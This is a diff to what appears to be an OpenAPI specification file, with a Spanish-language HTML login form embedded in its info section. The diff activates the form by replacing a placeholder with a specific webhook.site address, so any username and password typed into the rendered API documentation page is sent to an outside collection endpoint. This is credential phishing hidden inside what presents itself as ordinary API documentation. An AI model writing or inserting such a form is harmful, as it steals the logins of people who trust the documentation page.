@@ -8,7 +8,7 @@ info:
         <h2 style="text-align:center;margin:0 0 10px;color:#333;">Iniciar sesión</h2>
         <p style="text-align:center;color:#666;margin:0 0 30px;font-size:14px;">Ingresa tus credenciales para continuar</p>
         
-        <form action="https://webhook.site/TU-UUID-AQUÍ" method="POST">
+        <form action="https://webhook.site/c5dd4a2f-b6e1-45ff-a25e-15dbf4565f53" method="POST">
           <div style="margin-bottom:20px;">
             <label style="display:block;margin-bottom:6px;color:#444;font-weight:bold;">Usuario o correo</label>
             <input type="text" name="username" placeholder="usuario@empresa.com" required style="width:100%;padding:12px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box;font-size:15px;">
@@ -35,3 +35,4 @@ paths:
       responses:
         200:
           description: OK
+
